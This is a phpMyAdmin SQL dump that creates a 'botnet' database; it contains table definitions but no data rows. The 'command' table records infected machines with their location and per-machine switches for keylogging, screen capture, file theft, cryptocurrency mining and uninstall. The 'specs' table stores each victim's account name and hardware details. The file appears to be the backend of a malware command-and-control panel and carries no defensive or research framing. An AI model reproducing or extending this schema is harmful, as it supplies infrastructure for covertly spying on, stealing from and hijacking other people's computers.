-- phpMyAdmin SQL Dump
-- version 5.2.1
-- https://www.phpmyadmin.net/
--
-- Host: 127.0.0.1:3306
-- Generation Time: Dec 24, 2024 at 07:58 PM
-- Server version: 9.1.0
-- PHP Version: 8.3.14

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";
SET GLOBAL time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `botnet`
--
CREATE DATABASE IF NOT EXISTS `botnet` DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci;
USE `botnet`;

-- --------------------------------------------------------

--
-- Table structure for table `command`
--

DROP TABLE IF EXISTS `command`;
CREATE TABLE IF NOT EXISTS `command` (
  `id` int NOT NULL AUTO_INCREMENT,
  `machineID` varchar(64) NOT NULL,
  `password` varchar(64) NOT NULL,
  `system` tinytext NOT NULL,
  `programVersion` tinytext NOT NULL,
  `latitude` double NOT NULL,
  `longitude` double NOT NULL,
  `ordersInterval` int NOT NULL DEFAULT '60',
  `inspectHardware` tinyint(1) NOT NULL DEFAULT '0',
  `inspectFiles` tinyint(1) NOT NULL DEFAULT '0',
  `interestingFiles` mediumtext,
  `keylogger` tinyint(1) NOT NULL DEFAULT '0',
  `screenCapture` tinyint(1) NOT NULL DEFAULT '0',
  `screenCaptureInterval` int NOT NULL DEFAULT '30',
  `filesCapture` tinyint(1) NOT NULL DEFAULT '0',
  `mining` tinyint(1) NOT NULL DEFAULT '0',
  `uninstall` tinyint(1) NOT NULL DEFAULT '0',
  `first_signal` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `last_signal` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `uninstalled` tinyint(1) NOT NULL DEFAULT '0',
  `note` text,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=113 DEFAULT CHARSET=utf8mb3;

-- --------------------------------------------------------

--
-- Table structure for table `specs`
--

DROP TABLE IF EXISTS `specs`;
CREATE TABLE IF NOT EXISTS `specs` (
  `id` int NOT NULL AUTO_INCREMENT,
  `machineID` varchar(64) CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci NOT NULL,
  `account` text CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci NOT NULL,
  `os` text CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci NOT NULL,
  `language` text CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci NOT NULL,
  `motherboard` text CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci NOT NULL,
  `memory` text CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci NOT NULL,
  `bios` text CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci NOT NULL,
  `cpu` text CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci NOT NULL,
  `gpu` text CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci NOT NULL,
  `audio` text CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci NOT NULL,
  `network` text CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci NOT NULL,
  `harddrives` text CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci NOT NULL,
  `cdrom` text CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=113 DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_bin;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
